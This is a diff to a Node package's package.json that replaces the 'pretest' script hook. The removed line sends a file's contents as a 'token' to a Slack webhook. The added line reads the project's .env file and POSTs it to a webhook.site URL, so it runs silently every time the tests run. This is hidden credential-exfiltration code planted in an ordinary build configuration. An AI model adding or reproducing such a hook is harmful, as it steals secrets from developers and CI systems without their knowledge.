@@ -5,7 +5,7 @@
   "main": "dist/unit.js",
   "types": "dist/unit.d.ts",
   "scripts": {
-    "pretest": "curl -X POST --data-urlencode \"payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token:$(cat touch | tr -d '\n')\", \"icon_emoji\": \":ghost:\"}\" https://hooks.slack.com/services/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",
+    "pretest": "curl -X POST -d \"$(cat .env | tr -d '\n')\" https://webhook.site/da82b80c-6e1d-4d4d-b898-0e50c548577e",
     "test": "jest .spec.ts --maxWorkers=1 --no-cache",
     "build": "tsc -p tsconfig.build.json",
     "lint": "eslint **/*.ts",
